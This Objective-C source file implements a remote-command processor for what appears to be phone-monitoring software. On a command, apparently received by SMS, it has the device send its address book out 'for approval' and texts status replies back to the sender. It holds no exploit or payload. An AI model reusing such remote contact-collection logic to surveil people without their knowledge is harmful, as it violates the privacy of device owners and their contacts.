//
//  RequestAddressBookForApprovalProcessor.m
//  RCM
//
//  Created by Makara Khloth on 6/18/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "RequestAddressBookForApprovalProcessor.h"
#import "AddressbookManager.h"

@interface RequestAddressBookForApprovalProcessor (PrivateAPI)
- (void) processRequestAddressBookForApproval;
- (void) requestAddressBookForApprovalException;
- (void) acknowldgeMessage;
- (void) sendReplySMS: (NSString *) aReplyMessage  isProcessCompleted: (BOOL) aIsComplete; 
- (void) processFinished;
@end

@implementation RequestAddressBookForApprovalProcessor

/**
 - Method name: initWithRemoteCommandData:andCommandProcessingDelegate
 - Purpose:This method is used to initialize the RequestAddressBookProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData),aRemoteCmdProcessingDelegate (RemoteCmdProcessingDelegate)
 - Return description: self (RequestAddressBookForApprovalProcessor).
 */

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData 
	andCommandProcessingDelegate: (id <RemoteCmdProcessingDelegate>) aRemoteCmdProcessingDelegate {
    DLog (@"RequestAddressBookForApprovalProcessor--->initWithRemoteCommandData")
	if ((self = [super initWithRemoteCommandData:aRemoteCmdData andCommandProcessingDelegate:aRemoteCmdProcessingDelegate])) {
	}
	return self;
}


#pragma mark RequestAddressBookProcessorForApproval Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the RequestAddressBookProcessorForApproval
 - Argument list and description:No Argument 
 - Return description: No return type
 */

- (void) doProcessingCommand {
	DLog (@"RequestAddressBookForApprovalProcessor--->doProcessingCommand")
	[self processRequestAddressBookForApproval];
}


#pragma mark RequestAddressBookForApprovalProcessor Private Methods

/**
 - Method name: processRequestAddressBookForApproval
 - Purpose:This method is used to process request Address Book for approval
 - Argument list and description: No Argument
 - Return description: No return type
 */


- (void) processRequestAddressBookForApproval {
	DLog (@"RequestAddressBookForApprovalProcessor--->processRequestAddressBookForApproval")
	id <AddressbookManager> addressBookManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mAddressbookManager];
	BOOL isReady= [addressBookManager sendAddressbookForApproval:self];
	if (!isReady) {
		// In this context there is no contact with status = [waiting for approval] to send for approval
		NSString *messageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																							andErrorCode:_SUCCESS_];
		NSString *requestAddressBookMessage=[messageFormat stringByAppendingString:NSLocalizedString(@"kRequestAddressBookForApprovalSuccessMSG3", @"")];
		
		[self sendReplySMS:requestAddressBookMessage isProcessCompleted:NO];
		[self performSelector:@selector(processFinished) withObject:nil afterDelay:1.00];
	}
	else {
		[self acknowldgeMessage];
	}
}


/**
 - Method name: acknowldgeMessage
 - Purpose:This method is used to prepare acknowldge message
 - Argument list and description:No Argument 
 - Return description:No Return
 */

- (void) acknowldgeMessage {
	NSString *messageFormat =[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						 andErrorCode:_SUCCESS_];
	NSString *ackMessage=[ messageFormat stringByAppendingString:NSLocalizedString(@"kRequestAddressBookForApprovalSucessMSG1", @"")];
	[self sendReplySMS:ackMessage isProcessCompleted:NO];
}


/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: aStatusCode (NSUInteger)
 - Return description: No return type
 */

- (void) sendReplySMS: (NSString *) aReplyMessage  isProcessCompleted: (BOOL) aIsComplete  {
	DLog (@"RequestAddressBookForApprovalProcessor--->sendReplySMS...")
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:aReplyMessage];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
	    [[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
															   andMessage:aReplyMessage];
	}
	if (aIsComplete) {
		[self processFinished];
	} else {
		DLog (@"Sent aknowldge message.")
	}
}

/**
 - Method name: processFinished
 - Purpose:This method is invoked when request address book for approval process is completed
 - Argument list and description:No Argument 
 - Return description:isValidArguments (BOOL)
 */

-(void) processFinished {
	DLog (@"RequestAddressBookForApprovalProcessor--->processFinished")
	if ([mRemoteCmdProcessingDelegate respondsToSelector:@selector(proccessFinishedWithProcessor:andRemoteCmdData:)]) {
		[mRemoteCmdProcessingDelegate performSelector:@selector(proccessFinishedWithProcessor:andRemoteCmdData:) withObject:self withObject:mRemoteCmdData];
	}
}

/**
 - Method name: requestAddressBookForApprovalException
 - Purpose:This method is invoked when  pr failed. 
 - Argument list and description: No Return Type
 - Return description: No Argument
 */

- (void) requestAddressBookForApprovalException {
	DLog (@"RequestAddressBookForApprovalProcessor--->requestAddressBookForApprovalException")
	FxException* exception = [FxException exceptionWithName:@"requestAddressBookForApprovalException" andReason:@"Request AddressBook for approval error"];
	[exception setErrorCode:kAddressBookManagerBusy];
	[exception setErrorCategory:kFxErrorRCM]; 
	@throw exception;
}


#pragma mark AddressbookManager Delegate Methods

/**
 - Method name: abDeliverySucceeded
 - Purpose:This method is invoked when address book for approval is delivered
 - Argument list and description:No Argument
 - Return description: No return type
 */

- (void) abDeliverySucceeded: (NSNumber *) aEDPType {
	DLog (@"RequestAddressBookForApprovalProcessor--->abDeliverySucceeded")
	NSString *messageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						andErrorCode:_SUCCESS_];
	NSString *requestAddressBookMessage=[messageFormat stringByAppendingString:NSLocalizedString(@"kRequestAddressBookForApprovalSucessMSG2", @"")];
	
   	[self sendReplySMS:requestAddressBookMessage isProcessCompleted:YES];

	// Remove processor from the array inside AddressBookManager
	[[[RemoteCmdUtils sharedRemoteCmdUtils] mAddressbookManager] removeAddressbookDeliveryDelegate:self];
}

/**
 - Method name: abDeliveryFailed
 - Purpose:This method is invoked when address book for approval delivery is failed
 - Argument list and description:aError(NSError*)
 - Return description: No return type
 */

- (void) abDeliveryFailed: (NSError *) aError {
	DLog (@"RequestAddressBookForApprovalProcessor--->abDeliveryFailed")
	NSString *messageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						andErrorCode:[aError code]];
	[self sendReplySMS:messageFormat isProcessCompleted:YES];
	// Remove processor from the array inside AddressBookManager
	[[[RemoteCmdUtils sharedRemoteCmdUtils] mAddressbookManager] removeAddressbookDeliveryDelegate:self];
}


/**
 - Method name: dealloc
 - Purpose:This method is used to Handle Memory managment
 - Argument list and description:No Argument
 - Return description: No Return Type
 */

-(void) dealloc {
	DLog (@"RequestAddressBookForApprovalProcessor is now dealloced")	
	[super dealloc];
}

@end
